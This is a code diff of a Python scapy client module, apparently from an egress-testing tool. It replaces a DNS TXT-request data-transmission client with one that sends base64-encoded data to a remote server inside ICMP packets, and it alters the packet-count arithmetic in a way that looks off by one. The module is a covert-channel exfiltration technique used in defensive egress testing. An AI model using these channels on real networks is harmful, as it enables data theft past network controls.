@@ -1,8 +1,11 @@
 '''
 
-This is a DNS client that transmits data within DNS TXT requests
-Thanks to Raffi for his awesome blog posts on how this can be done
-http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/
+This is the template that should be used for client modules.
+A brief description of the client module can/should be placed
+up here.  All necessary imports should be placed between the
+comments and class declaration.
+
+Finally, be sure to rename your client module to a .py file
 
 '''
 
@@ -17,8 +20,8 @@ from scapy.all import *
 class Client:
 
     def __init__(self, cli_object):
-        self.protocol = "dns"
-        self.length = 35
+        self.protocol = "icmp"
+        self.length = 1100   # Number of cleartext characters allowed before b64 encoded
         self.remote_server = cli_object.ip
 
     def transmit(self, data_to_transmit):
@@ -38,19 +41,15 @@ class Client:
 
             # calcalate total packets
             if ((len(data_to_transmit) % self.length) == 0):
-                total_packets = len(data_to_transmit) / self.length
+                total_packets = len(data_to_transmit) / self.length + 1
             else:
-                total_packets = (len(data_to_transmit) / self.length) + 1
+                total_packets = (len(data_to_transmit) / self.length) + 2
 
             print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
 
             # Craft the packet with scapy
             try:
-                send(IP(dst=final_destination)/UDP()/DNS(
-                    id=15, opcode=0,
-                    qd=[DNSQR(qname="egress-assess.com", qtype="TXT")], aa=1, qr=0,
-                    an=[DNSRR(rrname=encoded_data, type="TXT", ttl=10)]),
-                    verbose=False)
+                send(IP(dst=final_destination)/ICMP()/(encoded_data), verbose=False)
             except KeyboardInterrupt:
                 print "[*] Shutting down..."
                 sys.exit()
